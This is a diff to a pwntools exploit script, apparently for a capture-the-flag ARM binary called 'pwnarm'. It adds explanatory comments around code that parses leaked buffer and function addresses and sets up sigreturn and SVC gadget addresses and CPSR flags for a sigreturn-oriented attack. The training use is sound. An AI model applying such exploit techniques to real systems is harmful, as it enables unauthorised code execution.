@@ -4,6 +4,7 @@ import time
 
 context.arch = "arm"
 
+# Do a hexdump of the contents
 def myhexdump(a_string):
 	from struct import unpack
 	i = 0
@@ -19,11 +20,12 @@ def myhexdump(a_string):
 
 p = process("./pwnarm")
 
+# Receive the buffer and the function address
 buf = int(p.recvline().strip().split(" = ")[1], 16)
 function = int(p.recvline().strip().split(" = ")[1], 16)
 log.info("Buffer=%x Function=%x" %(buf, function))
 
-
+# Now we got sigreturn and SVC instruction address
 SIGRETURN = function + 8
 SVC = function + 12
 
@@ -54,7 +56,6 @@ PSR_I_BIT = 0x00000080
 PSR_A_BIT = 0x00000100
 PSR_F_BIT = 0x00000040
 MODE_MASK = 0x0000001f
-
 
 cpsr = 0x40000001
 cpsr &= ~(PSR_F_BIT | PSR_A_BIT)
